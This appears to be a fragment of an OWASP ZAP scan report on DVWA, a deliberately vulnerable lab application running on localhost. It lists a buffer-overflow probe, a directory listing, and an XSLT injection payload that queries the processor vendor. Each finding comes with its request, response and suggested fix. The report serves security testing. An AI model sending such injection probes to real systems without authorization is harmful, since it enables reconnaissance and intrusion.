+							<ol>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-9">Buffer Overflow</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">GET https://localhost/DVWA/vulnerabilities/open_redirect/source/info.php?id=2</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>Buffer overflow errors are characterized by the overwriting of memory spaces of the background web process, which should have never been modified intentionally or unintentionally. Overwriting values of the IP (Instruction Pointer), BP (Base Pointer) and other registers causes exceptions, segmentation faults, and other process errors to occur. Usually these errors end execution of the application in an unexpected way. </p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>Potential Buffer Overflow.  The script closed the connection and threw a 500 Internal Server Error</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details>
+				<summary>Request line and header section (2710 bytes)</summary>
+				
+				<pre><code>GET https://localhost/DVWA/vulnerabilities/open_redirect/source/info.php?id=JPtSfHiXOIChQlabJhbNXUrosSVCUhNxmgLYvRpJnxhkhSbvOuDcDEPVmkRGOrBBsjTNxHHuNpIVgDjiSkODrXQBthpOVFKgCpENYeNGqxWZkVPgjPmclVXIbKdrVYEBhptlFpTHsLTjoNItEbMNCkVPZUFwpCUJvFfPbeqJJTsilLPSiyykMBfRWkroRMEUDPwwhPVtJYPvSMFNSAITQQYXtkGaZLUuPlrytXZVCbFYZvAFuTJhALEcXyHcLdMscqKbLkFcgJZgUwpLCeIDGyUQlhrbtpQjXuVXPENbtwrAejxugGuattpnIMtcnPlZqcpaWZdmEaHRGBsalgajCexSBCAwfXeyyreGaWCkeddpHPdBbMAqWgYfikvJiHemplYkRtLjVPhLZEoRYGfDAodfovmIiBPqlBNTWQJpvnKTfwGMgeUjXdqZicZfNASDLFXGPidKhbfknxoUGnAaBCjnOaGXsOyRyuTyPZLExgYEHfOovFeSkOtkAxQKyOIsmUXlRVGqsAirtmaRFSSwqNgSshoTEctGpLoyDNQtYfiMakvyCKrRgflaBBkafsYdEabIFnwKbFHYLlfsFWKSwbFHuFbGFCLrLFDUyXmxnAlitajsqxRdCHInEZgfRANixHSxiRVcxJHnoIPZtcnAupNdxoJdLNpaGgBoeqwdiEKdwlZWAHBfZWVEXYsrKTcVrYsrglwThPrMgvQPYRHXAUwBBfVIkklIVASRKRDBNeoKGVMDIVRsSjoUpmIsaZAcbHrsQvQcLVGyUayVsuEmqgbRUBkxRaLBZVRGerthJeFxDViVTOnpZrHTXILEHMIOShNAlCBHUAYeiSWirUWWwgfixYukkgRBQEApWZXdyODDDcAiToZkSrxGSMeqTCuFGBZYInNIgrLjSlOPPhOITQPJIoVGVliUcLClOBZGHVXRPeDgCsNUhglXxpYwpVRTDKfZnSCCrdTHpAptxMEjNTUuJhhlPPWkphuSvyWPJKqGxvZvowqGgHrLZbUYpCjfeBcuQjgKdbovHwCXeEPtlRkfnNfpvEvvIJbmlRXLhgejeVSpATDxmmMZcMBwQJeJvfRDVOVeJDVYDBioljTDuQNTHLPKGDcDsWWkqJWBEqoSPKWUbrbptiwICqpOiGflSLQxSElsHQpxCiGnsWrQYrRgSpLBVKtNvQuGpDhjClOTehXSutAfMqLQAyUNuKVPRBlbrxndiXcYPIqIPhVHOZjQvbaJnkoYOaEacuUkhTtmahQKLfZFUOLkgipergAvBuhvshwvZjTXTJBRVeYGyPETqPFnIgkxoDEACMfkoGFsYJIBlZtCebyLPGqdhgXrNSIqryiGxNVvpTOhUKtuULJjBGFylZMBTuBhSQuVBIKaNvCcxmnNsAhICtMNxlUufEnVEFZJWsUbxkcbpwyBhmHKQwvgliegkteIACaRqSNJXaTYKRRihXxZOklERFCcVUeosikcYMTCJwRqPeHytxQfKCkLKabDTUDAAjfjiIPcHYwgsxJjvlJMfSOIxyoRMlbJCTMOcIiisScnFsngxDUZdyNYKTiXbqrgAkIvikKFRjOyAbHWBUekRZLWcgjXbgePjZdrUtmrIeOkuDEuFsbQhBMZNlDdOEJIBEWZLqRdFARlEyPpDebVVWfMhJcUMgtSoniYqmnQNScCJfopKQRfhGWlWqRCkuAjLyBhaCAUGrqYxRpLNXLCKvPCAoYoXKouVVkoEmiXMKlAsPGMsUycFSnpmDeRyAcPGmKUjUCIycyuDIXkVLphKXBTKMGSkhcWJKyXAfysBkZERrwwkMWthGlREkSmcgjFNOZJQfVWXhcaeKXJVABRywlgCwOIUppDoYWZEcjaYsXfItZpoHIinuXpYOilTlKNoAOqZuOnUNPbIXluCKNQrjZbalEpIFEEDeNaUUsJSidShvZZVfACXygbhpscQNgmdRYthrwNGynVflRdpUHWhqBgrnwGhnrLPrsZZksAkgRJoRIHlWGREeQBDkGWTtjdQXRGlIGnlPKruuhPEyuuxvvCHuOdsrWgcyrfDtrfhrVjfmPPyYnbacmhHfYdbINVseUvsYKdoFdYRSRE HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/open_redirect/
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: security=medium; PHPSESSID=f1oehvl9gc45ksvvarav3u03sh
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (346 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 500 Internal Server Error
+Date: Mon, 01 Apr 2024 14:21:58 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 28
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (28 bytes)</summary>
+				
+				<pre><code>	&lt;p&gt;Missing quote ID.&lt;/p&gt;
+	</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>id</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>JPtSfHiXOIChQlabJhbNXUrosSVCUhNxmgLYvRpJnxhkhSbvOuDcDEPVmkRGOrBBsjTNxHHuNpIVgDjiSkODrXQBthpOVFKgCpENYeNGqxWZkVPgjPmclVXIbKdrVYEBhptlFpTHsLTjoNItEbMNCkVPZUFwpCUJvFfPbeqJJTsilLPSiyykMBfRWkroRMEUDPwwhPVtJYPvSMFNSAITQQYXtkGaZLUuPlrytXZVCbFYZvAFuTJhALEcXyHcLdMscqKbLkFcgJZgUwpLCeIDGyUQlhrbtpQjXuVXPENbtwrAejxugGuattpnIMtcnPlZqcpaWZdmEaHRGBsalgajCexSBCAwfXeyyreGaWCkeddpHPdBbMAqWgYfikvJiHemplYkRtLjVPhLZEoRYGfDAodfovmIiBPqlBNTWQJpvnKTfwGMgeUjXdqZicZfNASDLFXGPidKhbfknxoUGnAaBCjnOaGXsOyRyuTyPZLExgYEHfOovFeSkOtkAxQKyOIsmUXlRVGqsAirtmaRFSSwqNgSshoTEctGpLoyDNQtYfiMakvyCKrRgflaBBkafsYdEabIFnwKbFHYLlfsFWKSwbFHuFbGFCLrLFDUyXmxnAlitajsqxRdCHInEZgfRANixHSxiRVcxJHnoIPZtcnAupNdxoJdLNpaGgBoeqwdiEKdwlZWAHBfZWVEXYsrKTcVrYsrglwThPrMgvQPYRHXAUwBBfVIkklIVASRKRDBNeoKGVMDIVRsSjoUpmIsaZAcbHrsQvQcLVGyUayVsuEmqgbRUBkxRaLBZVRGerthJeFxDViVTOnpZrHTXILEHMIOShNAlCBHUAYeiSWirUWWwgfixYukkgRBQEApWZXdyODDDcAiToZkSrxGSMeqTCuFGBZYInNIgrLjSlOPPhOITQPJIoVGVliUcLClOBZGHVXRPeDgCsNUhglXxpYwpVRTDKfZnSCCrdTHpAptxMEjNTUuJhhlPPWkphuSvyWPJKqGxvZvowqGgHrLZbUYpCjfeBcuQjgKdbovHwCXeEPtlRkfnNfpvEvvIJbmlRXLhgejeVSpATDxmmMZcMBwQJeJvfRDVOVeJDVYDBioljTDuQNTHLPKGDcDsWWkqJWBEqoSPKWUbrbptiwICqpOiGflSLQxSElsHQpxCiGnsWrQYrRgSpLBVKtNvQuGpDhjClOTehXSutAfMqLQAyUNuKVPRBlbrxndiXcYPIqIPhVHOZjQvbaJnkoYOaEacuUkhTtmahQKLfZFUOLkgipergAvBuhvshwvZjTXTJBRVeYGyPETqPFnIgkxoDEACMfkoGFsYJIBlZtCebyLPGqdhgXrNSIqryiGxNVvpTOhUKtuULJjBGFylZMBTuBhSQuVBIKaNvCcxmnNsAhICtMNxlUufEnVEFZJWsUbxkcbpwyBhmHKQwvgliegkteIACaRqSNJXaTYKRRihXxZOklERFCcVUeosikcYMTCJwRqPeHytxQfKCkLKabDTUDAAjfjiIPcHYwgsxJjvlJMfSOIxyoRMlbJCTMOcIiisScnFsngxDUZdyNYKTiXbqrgAkIvikKFRjOyAbHWBUekRZLWcgjXbgePjZdrUtmrIeOkuDEuFsbQhBMZNlDdOEJIBEWZLqRdFARlEyPpDebVVWfMhJcUMgtSoniYqmnQNScCJfopKQRfhGWlWqRCkuAjLyBhaCAUGrqYxRpLNXLCKvPCAoYoXKouVVkoEmiXMKlAsPGMsUycFSnpmDeRyAcPGmKUjUCIycyuDIXkVLphKXBTKMGSkhcWJKyXAfysBkZERrwwkMWthGlREkSmcgjFNOZJQfVWXhcaeKXJVABRywlgCwOIUppDoYWZEcjaYsXfItZpoHIinuXpYOilTlKNoAOqZuOnUNPbIXluCKNQrjZbalEpIFEEDeNaUUsJSidShvZZVfACXygbhpscQNgmdRYthrwNGynVflRdpUHWhqBgrnwGhnrLPrsZZksAkgRJoRIHlWGREeQBDkGWTtjdQXRGlIGnlPKruuhPEyuuxvvCHuOdsrWgcyrfDtrfhrVjfmPPyYnbacmhHfYdbINVseUvsYKdoFdYRSRE</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>Connection: close</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Rewrite the background program using proper return length checking.  This will require a recompile of the background executable.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-10">Directory Browsing</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">GET https://localhost/DVWA/vulnerabilities/</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP_2021_A01</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html">OWASP_2017_A05</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>It is possible to view the directory listing.  Directory listing may reveal hidden scripts, include files, backup source files, etc. which can be accessed to read sensitive information.</p>
+ </td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (352 bytes)</summary>
+				
+				<pre><code>GET https://localhost/DVWA/vulnerabilities/ HTTP/1.1
+host: localhost
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0
+pragma: no-cache
+cache-control: no-cache
+referer: https://localhost/DVWA/
+Cookie: security=medium; PHPSESSID=f1oehvl9gc45ksvvarav3u03sh
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (173 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 14:19:41 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+Content-Length: 4817
+Content-Type: text/html;charset=UTF-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body">
+				<summary>Response body (4817 bytes)</summary>
+				
+				<pre><code>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /DVWA/vulnerabilities&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /DVWA/vulnerabilities&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign="top"&gt;&lt;img src="/icons/blank.gif" alt="[ICO]"&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=N;O=D"&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=M;O=A"&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=S;O=A"&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=D;O=A"&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/back.gif" alt="[PARENTDIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="/DVWA/"&gt;Parent Directory&lt;/a&gt;       &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="authbypass/"&gt;authbypass/&lt;/a&gt;            &lt;/td&gt;&lt;td align="right"&gt;2024-02-13 23:15  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="brute/"&gt;brute/&lt;/a&gt;                 &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 19:59  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="captcha/"&gt;captcha/&lt;/a&gt;               &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 19:59  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="csp/"&gt;csp/&lt;/a&gt;                   &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:00  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="csrf/"&gt;csrf/&lt;/a&gt;                  &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:01  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="exec/"&gt;exec/&lt;/a&gt;                  &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:01  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="fi/"&gt;fi/&lt;/a&gt;                    &lt;/td&gt;&lt;td align="right"&gt;2024-02-13 23:15  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="javascript/"&gt;javascript/&lt;/a&gt;            &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:01  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="open_redirect/"&gt;open_redirect/&lt;/a&gt;         &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:01  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="sqli/"&gt;sqli/&lt;/a&gt;                  &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:02  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="sqli_blind/"&gt;sqli_blind/&lt;/a&gt;            &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:02  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="upload/"&gt;upload/&lt;/a&gt;                &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:02  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/text.gif" alt="[TXT]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="view_help.php"&gt;view_help.php&lt;/a&gt;          &lt;/td&gt;&lt;td align="right"&gt;2024-02-13 23:15  &lt;/td&gt;&lt;td align="right"&gt;1.0K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/text.gif" alt="[TXT]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="view_source.php"&gt;view_source.php&lt;/a&gt;        &lt;/td&gt;&lt;td align="right"&gt;2024-02-13 23:15  &lt;/td&gt;&lt;td align="right"&gt;2.6K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/text.gif" alt="[TXT]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="view_source_all.php"&gt;view_source_all.php&lt;/a&gt;    &lt;/td&gt;&lt;td align="right"&gt;2024-02-13 23:15  &lt;/td&gt;&lt;td align="right"&gt;3.0K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="weak_id/"&gt;weak_id/&lt;/a&gt;               &lt;/td&gt;&lt;td align="right"&gt;2024-02-13 23:15  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="xss_d/"&gt;xss_d/&lt;/a&gt;                 &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:03  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="xss_r/"&gt;xss_r/&lt;/a&gt;                 &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:03  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="xss_s/"&gt;xss_s/&lt;/a&gt;                 &lt;/td&gt;&lt;td align="right"&gt;2024-03-29 20:03  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30 Server at localhost Port 443&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>https://localhost/DVWA/vulnerabilities/</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>Parent Directory</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Disable directory browsing.  If this is required, make sure the listed files does not induce risks.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-11">XSLT Injection</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">GET https://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>Injection using XSL transformations may be possible, and may allow an attacker to read system information, read and write files, or execute arbitrary code.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>The XSLT processor vendor name "Apache" was returned after an injection request.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (515 bytes)</summary>
+				
+				<pre><code>GET https://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21-- HTTP/1.1
+host: localhost
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0
+pragma: no-cache
+cache-control: no-cache
+referer: https://localhost/DVWA/vulnerabilities/open_redirect/
+Cookie: security=medium; PHPSESSID=f1oehvl9gc45ksvvarav3u03sh
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (185 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 403 Forbidden
+Date: Mon, 01 Apr 2024 15:16:03 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+Content-Length: 299
+Content-Type: text/html; charset=iso-8859-1
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (299 bytes)</summary>
+				
+				<pre><code>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30 Server at localhost Port 443&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>redirect</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>"/&gt;&lt;xsl:value-of select="system-property('xsl:vendor')"/&gt;&lt;!--</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>Apache</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Sanitize and analyze every user input coming from any client-side.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+							</ol>
+						</li>
+						
+					</ol>
+				</li>
+				  
+				 
+			</ol>
+		</section>
+
+		<section id="appendix" class="appendix">
+			<h2>Appendix</h2>
+
+			<section id="alert-types" class="alert-types">
+				<h3>Alert types</h3>
+				<p class="alert-types-intro">This section contains additional information on the types of alerts in the report.</p>
+				<ol>
+					<li id="alert-type-0">
+						<h4>Cross Site Scripting (DOM Based)</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/40026/">Cross Site Scripting (DOM Based)</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/79.html">79</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
+								<td>8</td>
+							</tr>
+							<tr>
+								<th scope="row">Reference</th>
+								<td>
+									<ol>
+										<li><a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></li>
+										<li><a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
+									</ol>
+								</td>
+							</tr>
+						</tbody></table>
+					</li>
+					<li id="alert-type-1">
+						<h4>Cross Site Scripting (Reflected)</h4>
+						<table class="alert-types-table">
+							<tbody><tr>
+								<th scope="row">Source</th>
+								<td>
+									
+									   <span>raised by an active scanner</span> <span>(<a href="https://www.zaproxy.org/docs/alerts/40012/">Cross Site Scripting (Reflected)</a>)
+									</span>   
+								</td>
+							</tr>
+							<tr>
+								<th scope="row">CWE ID</th>
+								<td><a href="https://cwe.mitre.org/data/definitions/79.html">79</a></td>
+							</tr>
+							<tr>
+								<th scope="row">WASC ID</th>
